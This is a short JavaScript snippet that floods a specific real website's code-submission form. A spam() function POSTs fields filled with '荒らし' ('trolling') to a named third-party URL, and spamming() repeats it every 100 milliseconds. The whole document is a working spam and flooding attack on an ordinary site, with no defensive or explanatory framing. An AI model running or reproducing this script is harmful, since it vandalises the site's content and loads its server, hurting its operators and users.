function spam() {
    var xhr = new XMLHttpRequest();
    xhr.open('POST', 'http://futtobecom.stars.ne.jp/3ds/Codes/POST');
    xhr.setRequestHeader('content-type', 'application/x-www-form-urlencoded;charset=UTF-8');
    xhr.send('Area[0]=荒らし&Area[1]=荒らし&Area[2]=0&Area[3]=0&Area[4]=荒らし');
}

function spamming() {
    setInterval(spam, 100);
}
